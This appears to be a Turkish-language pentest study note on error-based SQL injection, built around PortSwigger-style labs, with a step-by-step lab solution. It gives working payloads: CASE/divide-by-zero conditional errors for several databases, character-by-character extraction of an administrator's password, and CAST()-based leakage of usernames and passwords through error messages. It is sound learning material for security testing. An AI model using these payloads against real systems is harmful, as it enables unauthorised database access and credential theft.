 **Error-Based SQL Injection**, veritabanından hassas verileri sızdırmak veya bu veriler hakkında çıkarım yapmak için doğrudan **hata mesajlarını kullandığın** durumlara denir. Bu yöntem "blind" (kör) zafiyetlerde bile işe yarar. Neler yapabileceğin, veritabanının ayarlarına ve tetikleyebildiğin hata türlerine bağlıdır.


Bu zafiyeti kullanarak yapabileceğin iki temel senaryo vardır:

* **Koşula Bağlı Hata Döndürme:** Uygulamayı, yazdığın mantıksal (boolean) bir ifadenin sonucuna göre bilerek belirli bir hata mesajı vermeye zorlayabilirsin.

* **Veriyi Ekrana Basan Hatalar (Verbose):** Veritabanının, aradığın veriyi doğrudan hata mesajının içinde bir çıktı olarak vermesini sağlayacak özel hatalar tetikleyebilirsin. Bu durum, normalde hiçbir şey göremediğin "kör" (blind) bir SQL injection zafiyetini, veriyi direkt okuyabildiğin görünür bir zafiyete dönüştürür.

### Koşullu Hataları Tetikleyerek Blind SQL Injection İstismarı - Devamı

Bunun nasıl çalıştığını görmek için, sırasıyla aşağıdaki `TrackingId` çerez (cookie) değerlerini içeren iki isteğin gönderildiğini varsayalım:

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Bu girdiler, bir koşulu test etmek ve ifadenin doğru (true) olup olmamasına bağlı olarak farklı bir sonuç döndürmek için `CASE` anahtar kelimesini kullanır:

* İlk girdide, `CASE` ifadesi `'a'` sonucunu verir ve bu herhangi bir hataya neden olmaz[.
* İkinci girdide ise, ifade `1/0` sonucunu verir ve bu bir sıfıra bölme (divide-by-zero) hatasına neden olur.

Eğer bu hata, uygulamanın HTTP yanıtında bir farklılığa yol açıyorsa, enjekte ettiğiniz koşulun doğru olup olmadığını anlamak için bu farklılığı kullanabilirsiniz.

Bu tekniği kullanarak, her seferinde bir karakteri test edip verileri dışarı sızdırabilirsiniz:

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END)='a
```

> [!note] Not
> Koşullu hataları tetiklemenin farklı yolları vardır ve farklı veritabanı türlerinde farklı teknikler daha iyi çalışır. Daha fazla detay için SQL injection hile kağıdına (cheat sheet) göz atabilirsiniz.

### Veritabanı Mimarilerine Göre Hata Tetikleme (Syntax Farklılıkları)

Blind SQL Injection testlerinde (özellikle Error-based senaryolarda), her veritabanının hata verme ve sorgu çalıştırma biçimi (syntax) farklıdır. Sorguların 500 Internal Server Error verip vermediğini test ederken hedef veritabanına uygun syntax kullanılmalıdır.

**1. Oracle (En Katı Olanı)**
Oracle, `FROM` parametresi olmadan `SELECT` işlemi yapılmasına izin vermez. Bu yüzden sorgulara her zaman Oracle'ın sanal tablosu olan `dual` eklenmek zorundadır. Ayrıca string birleştirme için `||` operatörünü kullanır.
```sql
-- Doğru (True) durumda hata fırlatacak Oracle payload'u:
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
```

**2. Microsoft SQL Server**
`dual` tablosuna ihtiyaç duymaz. String birleştirme işlemi için `+` operatörünü kullanır.
```sql
-- Doğru (True) durumda hata fırlatacak MSSQL payload'u:
' + (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END) + '
```

**3. PostgreSQL**
`dual` tablosuna ihtiyaç duymaz ancak Oracle gibi string birleştirme için `||` operatörünü kullanır. Tipler konusunda hassas olduğu için hata çıktısını `CAST` ile metne (text) çevirmek gerekebilir.
```sql
-- Doğru (True) durumda hata fırlatacak PostgreSQL payload'u:
' || (SELECT CASE WHEN (1=1) THEN CAST(1/0 AS TEXT) ELSE '' END) || '
```

**4. MySQL / Genel Geçer (Standart AND/OR ile)**
Eğer string birleştirme yerine mantıksal operatörler (AND/OR) kullanılacaksa, çoğu modern veritabanı `dual` olmadan şu yapıyı kabul eder (Oracle hariç):
```sql
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

> [!tip] Pentest İpucu
> Eğer klasik `' AND 1=1--` denemelerinizin hepsi **500 Internal Server Error** döndürüyorsa, arka planda muhtemelen bir **Oracle** veritabanı vardır ve sorgunuz syntax hatasından dolayı patlıyordur. Hemen `FROM dual` ve `||` yapısına geçiş yapın.

### Oracle: Error-Based Blind SQLi (Tip Uyuşmazlığı ve Alt Sorgu Çözümü)

Oracle veritabanlarında `CASE` ifadeleri kullanılırken, `THEN` ve `ELSE` bloklarının döndürdüğü veri tiplerinin birbiriyle tamamen aynı olması zorunludur. Aksi takdirde koşul doğru veya yanlış olsa bile sorgu çalışmadan **500 Internal Server Error** (Data Type Mismatch) fırlatır.

Bu durumu aşmak için sayısal hatalar (`1/0` gibi) `TO_CHAR()` fonksiyonu ile metne (string) çevrilmelidir. Ayrıca, veri çekilecek tablo doğrudan ana `FROM` koşuluna eklenerek satır çakışmaları önlenmelidir.

**Örnek Çalışan Payload (Karakter Tahmini):**
```sql
TrackingId=tDYRwCm55klqXBki' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTR(Password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE Username = 'Administrator')='a--
```

Cookie: TrackingId=tDYRwCm55klqXBki' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTR(Password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE Username = 'Administrator')='a--


**Bu Payload Nasıl Çalışıyor?**
1.  **`FROM users WHERE Username = 'Administrator'`**: Doğrudan hedef satırı izole eder.
2.  **`SUBSTR(Password, 1, 1) > 'm'`**: Şifrenin ilk harfini kontrol eder.
3.  **`TO_CHAR(1/0)`**: Eğer harf 'm'den büyükse (True), sıfıra bölme hatası fırlatır ve metin formatında döndürür (Böylece sunucu 500 hatası verir).
4.  **`ELSE 'a'`**: Eğer harf 'm'den büyük değilse (False), normal bir 'a' karakteri döndürerek sayfanın sorunsuz yüklenmesini (200 OK) sağlar.

> [!tip] Pentest İpucu
> Oracle üzerinde Blind SQLi yaparken sürekli 500 hatası alıyorsanız, sorunu mantıksal koşullarda değil; veri tiplerinde (`TO_CHAR`), metin parçalama fonksiyonlarında (`SUBSTR`) veya tablo yapılandırmalarında arayın.

 ' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')='a

## Ayrıntılı Hata Mesajları (Verbose Error-Based SQL Injection)

**Kavram:**
Veritabanı yapılandırma eksiklikleri nedeniyle, uygulamanın arka planda oluşturduğu tam SQL sorgusunun veya veritabanı şemasının, kullanıcıya dönen hata mesajları içinde doğrudan ifşa olması durumudur. Kör (Blind) SQL'in aksine, karanlıkta el yordamıyla aramak yerine sistemin haritası doğrudan ekranda görülür.

**Mekanizma:**
Sistemdeki zafiyetli parametreye (örneğin `id=1`) beklenmeyen bir SQL karakteri (genellikle tek tırnak `'`) gönderilerek sorgunun sözdizimi (syntax) kasten bozulur. Güvensiz yapılandırılmış sistem, bu hatayı gizlemek yerine tüm teknik detayıyla ekrana yansıtır.

**Örnek Hata Analizi:**
> `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`

* **Unterminated string literal:** Açılan bir metnin düzgün kapatılmadığını ifade eder.
* **Sızan Arka Plan Sorgusu:** `SELECT * FROM tracking WHERE id = '''`
  * Bu çıktı sayesinde tablonun adının `tracking`, aranan sütunun `id` olduğu ve sorgunun `SELECT *` ile başladığı doğrudan öğrenilir. 
  * Orijinal kurgunun `id = 'değer'` olduğu, bizim gönderdiğimiz tek tırnak (`'`) karakteriyle yapının `id = '''` şekline dönüşüp bozulduğu görülür.

**Saldırı Kurgusuna Sağladığı Avantajlar:**

* **Doğrudan Görüş:** Evet veya Hayır soruları sormaya, `1/0` gibi koşullu hatalar üretmeye (Blind SQLi) gerek kalmaz.
* **Tam İsabet Payload:** Girdinin, arka plandaki sorgunun tam olarak neresine yerleştiği bilindiği için, sözdizimini bozmayacak ve geri kalanı yorum satırına alacak başarılı bir deneme çok daha kolay ve hızlı inşa edilir.

## Ayrıntılı Hata Mesajları ile Veri Sızdırma: CAST() Tekniği (Verbose SQL Injection)

**Kavram:**
Uygulamayı, veritabanı sorgusundan dönen verilerin bir kısmını içeren bir hata mesajı üretmeye zorlayabilirsiniz. Bu yöntem, normalde hiçbir şey göremediğiniz kör (blind) SQL enjeksiyonu zafiyetini etkili bir şekilde görünür bir duruma dönüştürür.

**Mekanizma (`CAST` Fonksiyonu):**
Bunu başarmak için, bir veri tipini diğerine dönüştürmenizi sağlayan `CAST()` fonksiyonunu kullanabilirsiniz. Okumaya çalıştığınız veri genellikle bir metindir (string). Bu metni `int` (tam sayı) gibi uyumsuz bir veri tipine dönüştürmeye çalışmak, veritabanının hata vermesine neden olur.

**Örnek Senaryo:**
Diyelim ki hedef sorgu içerisine şu ifadeyi enjekte ettiniz:
`CAST((SELECT example_column FROM example_table) AS int)`

Veritabanı, tablodan çektiği metin tabanlı veriyi tam sayıya çeviremediğinde doğrudan şu şekilde bir hata fırlatabilir:
> `ERROR: invalid input syntax for type integer: "Example data"`

Bu hata mesajındaki `"Example data"` kısmı, veritabanından sızdırmak istediğiniz asıl gizli verinin ifşa olmuş halidir. Sistem "ben bu veriyi sayıya çeviremedim" derken verinin kendisini ekrana yazdırmış olur.

**Kullanım Avantajı:**
Bu tür bir sorgu, sistemdeki bir karakter sınırının koşullu (conditional) yanıtları tetiklemenizi engellediği durumlarda da oldukça kullanışlı olabilir.


## Ayrıntılı Hata Mesajları ile SQL Enjeksiyonu (Visible Error-Based SQLi) Çözüm Adımları

### 1. Zafiyetin Tespiti ve Hazırlık
* **Hedefin Belirlenmesi:** Burp Suite üzerinden `HTTP history` (HTTP Geçmişi) sekmesine giderek içinde `TrackingId` çerezi (cookie) barındıran bir `GET` isteği bulun.
* **Test Ortamına Aktarım:** İlgili isteği analiz etmek ve manipüle etmek için **Repeater** sekmesine gönderin.
* **Hata Tetikleme:** `TrackingId` değerinin sonuna sadece bir tek tırnak (`'`) ekleyip isteği forward edin (Örn: `TrackingId=ogAZZfxtOKUELbuJ'`).
* **Hata Analizi:** Dönen **500 Internal Server Error** yanıtını incelediğinizde, ayrıntılı hata mesajının çerez değerinizi de içeren arka plandaki tam SQL sorgusunu ifşa ettiğini ve "kapatılmamış bir dize sabiti" (unterminated string literal) olduğunu belirttiğini göreceksiniz.

### 2. Sorgu Sözdizimini (Syntax) Düzeltme
* **Yorum Satırı Ekleme:** Orijinal sorgunun geri kalanını etkisiz hale getirmek ve sözdizimini onarmak için girdinin sonuna yorum karakterleri (`--`) ekleyin:
  ```sql
  TrackingId=ogAZZfxtOKUELbuJ'--
  ```
* İsteği gönderdiğinizde hatanın ortadan kalktığını ve sayfanın sorunsuz açıldığını doğrulayın. Bu, enjeksiyon iskeletinizin geçerli olduğunu kanıtlar.

### 3. Veri Tipi Dönüştürme (CAST) ve Koşul Hatalarını Aşma
* **CAST Fonksiyonunu Enjekte Etme:** Genel bir `SELECT` alt sorgusu (subquery) ekleyerek dönen değeri `int` (tam sayı) tipine dönüştürmeye çalışın:
  ```sql
  TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
  ```
* **Boolean Hatası:** İsteği gönderdiğinizde, SQL motorunun bir `AND` koşulundan sonra boolean (doğru/yanlış) bir ifade beklediğini belirten yeni bir hata alacaksınız.
* **Koşulu Tamamlama:** `CAST` fonksiyonunu, eşittir (`=`) operatörü kullanarak basit bir matematiksel koşulun parçası haline getirin:
  ```sql
  TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
  ```
* İsteği tekrar göndererek sorgunun tekrar geçerli ve hatasız hale geldiğini gözlemleyin.

### 4. Karakter Sınırları ve Kesilme (Truncation) Sorununu Çözme
* **Hedef Tabloya Yönelme:** Mevcut genel `SELECT` ifadenizi, veritabanındaki `users` tablosundan kullanıcı adlarını çekecek şekilde uyarlayın:
  ```sql
  TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
  ```
* **Kesilme Hatası (Truncation):** Başlangıçta aldığınız "kapatılmamış dize" hatasının tekrar belirdiğini fark edeceksiniz. Bunun sebebi, sunucudaki karakter sınırı nedeniyle uzunlaşan sorgunuzun sonundaki yorum karakterlerinin (`--`) kesilmesi ve sorguya dahil edilmemesidir.
* **Karakter Alanı Yaratma:** Çerezin orijinal rastgele değerini (`ogAZZfxtOKUELbuJ`) tamamen silerek ekstra karakter alanı (yer) açın:
  ```sql
  TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
  ```
* İsteği gönderdiğinizde, bu kez "birden fazla satır döndürüldü" (more than one row returned) şeklinde yeni bir veritabanı hatası alacaksınız. Bu, sorgunun başarıyla çalıştığını ancak çok fazla veri çektiğini gösterir.

### 5. Veri Sızdırma ve Şifre Ele Geçirme
* **Satır Limitini Belirleme:** Alt sorgunun tek seferde yalnızca tek bir kayıt döndürmesini sağlamak için `LIMIT 1` kısıtlamasını ekleyin:
  ```sql
  TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
  ```
* **Kullanıcı Adı İfşası:** İsteği gönderdiğinizde, hata mesajının hedef tablodaki ilk kullanıcı adını ekrana basarak sızdırdığını göreceksiniz: 
  `HATA: integer türü için geçersiz giriş sözdizimi: "administrator"`
* **Şifreyi Sızdırma:** `administrator` kullanıcısının tablodaki ilk kayıtta yer aldığını öğrendiğinize göre, sorgudaki `username` sütununu `password` olarak değiştirerek şifreyi çekin:
  ```sql
  TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
  ```
* Hata mesajı üzerinden elde ettiğiniz (sızan) şifreyi kopyalayın ve laboratuvar sayfasında yönetici (administrator) olarak oturum açarak süreci tamamlayın.
